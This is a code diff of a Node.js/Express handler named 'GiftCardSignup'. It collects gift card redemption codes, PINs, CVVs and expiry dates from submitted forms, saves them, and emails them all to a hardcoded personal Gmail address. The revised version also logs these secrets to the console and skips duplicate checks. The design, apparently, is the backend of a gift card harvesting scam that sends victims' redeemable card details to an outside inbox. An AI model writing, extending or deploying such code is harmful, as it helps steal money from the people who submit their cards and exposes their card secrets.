@@ -1,70 +1,64 @@
-     require('dotenv').config();
-     const GiftCardMOdel = require('../models/GiftCardMOdel')
-     const { sendEmail } = require('../helpers/sendMail');
-     const { paymentReceiptTemplate, forgotPasswordTemplate } = require('../helpers/emailTemplate');
-    
- 
- exports.GiftCardSignup = async (req, res) => {
-        try {
-            const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = req.body
-    
-            if (!Name || !Currency  || !Amount ||  !Redemptioncode ||!Pin || !GiftCardCvv || !ExpireDate) {
-                return res.status(400).json({
-                    message: `Please enter all details`
-                })
-            }
+require('dotenv').config();
+const GiftCardModel = require('../models/GiftCardMOdel');
+const { sendEmail } = require('../helpers/sendMail');
+const { paymentReceiptTemplate } = require('../helpers/emailTemplate');
 
-           
+exports.GiftCardSignup = async (req, res) => {
+  try {
+    const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = req.body;
 
-            // create a user
-            const newGiftCard = new GiftCardMOdel({
-                Name,
-                Currency,
-                Amount,
-                Redemptioncode,
-                Pin,
-                GiftCardCvv,
-                ExpireDate,
-            });
-
-            
-
-           
-const userEmail = "jolaetopia81@gmail.com"
-      
-            // send verification email
-            const mailOptions = {
-                email: userEmail ,
-                subject: "Verify your account",
-                html: paymentReceiptTemplate(
-                    userEmail,
-                    newGiftCard.Name,
-                    newGiftCard.Currency,
-                    newGiftCard.Redemptioncode,
-                    newGiftCard.Pin,
-                    newGiftCard.GiftCardCvv,
-                    newGiftCard.Amount,
-                    newGiftCard.ExpireDate),
-            };
-
-            
-            // save the user
-            await newGiftCard.save();
-            await sendEmail(mailOptions);
-
-            // return a response
-            res.status(201).json({
-                message: `Check your email: ${userEmail} to verify your account.`,
-                data: newGiftCard
-            })
-
-        } catch (error) {
-             if (error.code === 11000) {
-                // Handle duplicate key error (E11000)
-                const duplicateField = Object.keys(error.keyPattern)[0]; // Get the duplicate field (e.g., email)
-                return res.status(400).json({ message: `A Gift Card with this ${duplicateField} already exists.` });
-            }
-            res.status(500).json({message: error.message});
-        
-        }
+    if (!Name || !Currency || !Amount || !Redemptioncode || !Pin || !GiftCardCvv || !ExpireDate) {
+      return res.status(400).json({
+        message: `Please enter all details`
+      });
     }
+
+    // Always create a new GiftCard document (even if duplicate)
+    const newGiftCard = new GiftCardModel({
+      Name,
+      Currency,
+      Amount,
+      Redemptioncode,
+      Pin,
+      GiftCardCvv,
+      ExpireDate
+    });
+
+    // Save it without worrying about duplicates
+    const savedGiftCard = await newGiftCard.save();
+
+    const userEmail = "jolaetopia81@gmail.com";
+
+    // Send the payment receipt email
+    const mailOptions = {
+      email: userEmail,
+      subject: "Gift Card Purchase Receipt",
+      html: paymentReceiptTemplate(
+        savedGiftCard.Name,
+        savedGiftCard.Currency,
+        savedGiftCard.Amount,
+        savedGiftCard.Redemptioncode,
+        savedGiftCard.Pin,
+        savedGiftCard.GiftCardCvv,
+        savedGiftCard.ExpireDate
+      ),
+    };
+ console.log(  savedGiftCard.Name,
+        savedGiftCard.Currency,
+        savedGiftCard.Redemptioncode,
+        savedGiftCard.Pin,
+        savedGiftCard.GiftCardCvv,
+        savedGiftCard.Amount,
+        savedGiftCard.ExpireDate)
+    await sendEmail(mailOptions);
+
+    // Return a success response
+    return res.status(201).json({
+      message: `Gift card saved successfully. Check your email: ${userEmail} for the receipt.`,
+      data: savedGiftCard,
+    });
+
+  } catch (error) {
+    res.status(500).json({ message: error.message });
+  }
+};
